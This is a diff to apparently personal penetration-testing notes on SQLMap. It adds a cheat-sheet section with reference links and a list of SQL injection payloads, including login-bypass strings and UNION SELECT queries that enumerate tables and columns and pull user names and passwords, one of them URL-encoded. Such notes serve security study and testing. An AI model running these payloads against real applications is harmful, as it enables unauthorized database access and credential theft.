@@ -50,3 +50,20 @@ SQLMap is an open-source tool that automates the process of detecting and exploi
 *   `--dump -C <columns> -T <table> -D <database>`: Dump data from a table.
 *   `--batch`: Use default answers for all questions.
 *   `--level=5 --risk=3`: Increase the number of checks performed.
+
+## Cheatsheet
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
+URL encoding:
+https://www.w3schools.com/tags/ref_urlencode.ASP
+
+- test' or 1=1--
+- 1' and '1'='1'--
+- 1' OR '1'='1'#
+- 'UNION SELECT table_name, NULL FROM information_schema.tables #
+- 'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #
+- 'UNION SELECT user, password FROM users #
+- 1 UNION SELECT user, password FROM users --
+- 1%20+UNION+SELECT+user,password+FROM+users%23
+- 'UNION SELECT user, password FROM users #
